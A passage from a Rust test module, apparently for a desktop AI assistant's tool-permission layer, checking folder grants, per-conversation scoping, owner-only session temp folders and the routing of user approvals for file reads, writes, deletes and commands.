        assert_eq!(approval_route(&store, &proposal), ApprovalRoute::Inline);
        let mut store = store;
        store.set_mode("g2", ApprovalMode::Allow).expect("allow g2");
        assert_eq!(approval_route(&store, &proposal), ApprovalRoute::Auto);
        // A revoked grant fails closed to a prompt.
        store.revoke("g2");
        assert_eq!(approval_route(&store, &proposal), ApprovalRoute::Inline);
    }

    #[test]
    fn approval_cards_and_confirmations_carry_no_em_dash() {
        let cases = [
            ToolAction::MovePath {
                from: "/u/a".into(),
                to: "/u/b".into(),
                overwrite: true,
            },
            ToolAction::DeletePath {
                path: "/u/a".into(),
            },
            ToolAction::RunCommand {
                cmd: "ls".into(),
                cwd_in_grant: "/u".into(),
            },
        ];
        for action in &cases {
            let (title, text) = confirmation_text(action, "s", None);
            assert!(!title.contains('—') && !text.contains('—'), "{text}");
        }
        assert!(!COMPUTER_WIDE_WARNING.contains('—'));
    }

    // ------------------------------- per-conversation folder selection --

    /// Two granted folders ("g1" on `a`, "g2" on `b`), profile nan, and a
    /// state whose session temp folders live in their own tempdir.
    struct TwoFolders {
        dir: PathBuf,
        a: PathBuf,
        b: PathBuf,
        st: ToolsState,
        _guards: Vec<tempfile::TempDir>,
    }

    fn two_folder_layout() -> TwoFolders {
        let (a, ga) = tempdir();
        let (b, gb) = tempdir();
        let (scratch_base, gs) = tempdir();
        let (dir, gd) = granted_dir(&a);
        let mut store = grants::load_or_seed(&dir).expect("load");
        store
            .add_grant("g2".into(), "nan", canon(&b), "t".into())
            .expect("add");
        grants::save(&dir, &store).expect("save");
        let st = ToolsState {
            scratch_base,
            ..ToolsState::default()
        };
        TwoFolders {
            dir,
            a: canon(&a),
            b: canon(&b),
            st,
            _guards: vec![ga, gb, gs, gd],
        }
    }

    #[test]
    fn a_scoped_conversation_only_reaches_its_selected_folders() {
        let TwoFolders {
            dir,
            a,
            b,
            st,
            _guards,
        } = two_folder_layout();
        fs::write(a.join("x.txt"), "a").expect("seed");
        fs::write(b.join("y.txt"), "b").expect("seed");
        st.set_conversation_scope(1, Some(vec!["g2".into()]));
        let read = |path: &Path, conversation: Option<i64>| {
            propose(
                &dir,
                &st,
                "nan",
                conversation,
                &ToolAction::ReadFile {
                    path: path_str(path),
                },
            )
        };
        // Unselected folder: refused as outside the conversation's scope.
        let err = read(&a.join("x.txt"), Some(1)).expect_err("g1 not selected");
        assert_eq!(err.kind, "escape");
        // Selected folder: fine.
        let ok = read(&b.join("y.txt"), Some(1)).expect("g2 selected");
        assert_eq!(ok.grant_id.as_deref(), Some("g2"));
        // Another conversation without a scope keeps every grant (legacy).
        read(&a.join("x.txt"), Some(2)).expect("unscoped conversation");
        // Clearing the scope restores every grant.
        st.set_conversation_scope(1, None);
        read(&a.join("x.txt"), Some(1)).expect("scope cleared");
    }

    #[test]
    fn no_folder_selected_refuses_reads_and_offers_the_session_temp_folder() {
        let TwoFolders {
            dir,
            a,
            st,
            _guards,
            ..
        } = two_folder_layout();
        fs::write(a.join("x.txt"), "a").expect("seed");
        st.set_conversation_scope(7, Some(Vec::new()));

        // Reads of the user's folders are refused: nothing is mounted.
        let err = propose(
            &dir,
            &st,
            "nan",
            Some(7),
            &ToolAction::ReadFile {
                path: path_str(&a.join("x.txt")),
            },
        )
        .expect_err("nothing mounted");
        assert_eq!(err.kind, "escape");

        // The workspace is the session temp folder only, inside the base.
        let ws = workspace_for_conversation_in(&dir, &st, "nan", 7).expect("workspace");
        let scratch = ws.scratch.clone().expect("scratch");
        assert_eq!(ws.roots, vec![scratch.clone()]);
        assert!(scratch.starts_with(canon(&st.scratch_base)));
        assert!(scratch.ends_with("conversation-7"));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = fs::metadata(&scratch).expect("meta").permissions().mode();
            assert_eq!(mode & 0o777, 0o700, "owner-only");
        }

        // A write there still asks inline (never auto) and then lands.
        let approver = FakeApprover::answering(true);
        let target = scratch.join("informe.md");
        let proposal = propose(
            &dir,
            &st,
            "nan",
            Some(7),
            &ToolAction::WriteFile {
                path: path_str(&target),
                content: "hola".into(),
            },
        )
        .expect("temp write proposed");
        assert_eq!(
            proposal.grant_id.as_deref(),
            Some(format!("{SCRATCH_GRANT_PREFIX}7").as_str())
        );
        let route =
            tauri::async_runtime::block_on(approve_proposal(&dir, &st, &approver, &proposal))
                .expect("approved");
        assert_eq!(route, ApprovalRoute::Inline);
        let card = approver.inline_calls.lock().expect("lock")[0].clone();
        assert_eq!(
            card.path.as_deref(),
            Some(path_str(&target).as_str()),
            "shown plainly"
        );
        execute(&dir, &st, &proposal.id).expect("executed");
        assert_eq!(fs::read_to_string(&target).expect("written"), "hola");

        // The temp folder never persists into tools.json.
        let stored = grants::load_or_seed(&dir).expect("load");
        assert!(
            stored
                .grants
                .iter()
                .all(|g| !g.id.starts_with(SCRATCH_GRANT_PREFIX))
        );

        // The temp folder root itself can never be deleted.
        let err = propose(
            &dir,
            &st,
            "nan",
            Some(7),
            &ToolAction::DeletePath {
                path: path_str(&scratch),
            },
        )
        .expect_err("root protected");
        assert_eq!(err.kind, "scope");
    }

    #[test]
    fn selecting_a_folder_removes_the_session_temp_folder() {
        let TwoFolders {
            dir,
            b,
            st,
            _guards,
            ..
        } = two_folder_layout();
        st.set_conversation_scope(3, Some(vec!["g2".into()]));
        let ws = workspace_for_conversation_in(&dir, &st, "nan", 3).expect("workspace");
        assert_eq!(ws.scratch, None);
        assert_eq!(ws.roots, vec![b]);
        // A temp-folder path is refused once a real folder is selected.
        let err = propose(
            &dir,
            &st,
            "nan",
            Some(3),
            &ToolAction::WriteFile {
                path: path_str(&st.scratch_dir(3).join("x.md")),
                content: "x".into(),
            },
        )
        .expect_err("temp folder not offered");
        assert_eq!(err.kind, "escape");
    }

    #[test]
    fn computer_wide_conversations_are_unaffected_by_an_empty_selection() {
        let (home, dir, _guard) = computer_wide_layout();
        let (scratch_base, _gs) = tempdir();
        let st = ToolsState {
            scratch_base,
            ..ToolsState::default()
        };
        st.set_conversation_scope(9, Some(Vec::new()));
        let ws = workspace_for_conversation_in(&dir, &st, "nan", 9).expect("workspace");
        assert!(ws.computer_wide);
        assert_eq!(ws.scratch, None, "no temp folder under computer-wide");
        assert_eq!(ws.roots, vec![home]);
    }

    #[test]
    fn a_native_decision_is_reported_to_the_approver() {
        struct Recording(Mutex<Vec<(Option<i64>, bool)>>);
        impl Approver for Recording {
            async fn native(&self, _t: String, _x: String) -> bool {
                true
            }
            async fn inline(&self, _r: ApprovalRequest) -> bool {
                false
            }
            fn native_decided(&self, request: &ApprovalRequest, granted: bool) {
                self.0
                    .lock()
                    .expect("lock")
                    .push((request.conversation_id, granted));
            }
        }
        let (home, app_data, _guard) = computer_wide_layout();
        let st = state();
        fs::write(home.join("nota.txt"), "x").expect("seed");
        let proposal = propose(
            &app_data,
            &st,
            "nan",
            Some(4),
            &ToolAction::ReadFile {
                path: path_str(&home.join("nota.txt")),
            },
        )
        .expect("proposed");
        let approver = Recording(Mutex::new(Vec::new()));
        let route =
            tauri::async_runtime::block_on(approve_proposal(&app_data, &st, &approver, &proposal))
                .expect("approved");
        assert_eq!(route, ApprovalRoute::Native);
        assert_eq!(*approver.0.lock().expect("lock"), vec![(Some(4), true)]);
    }
}
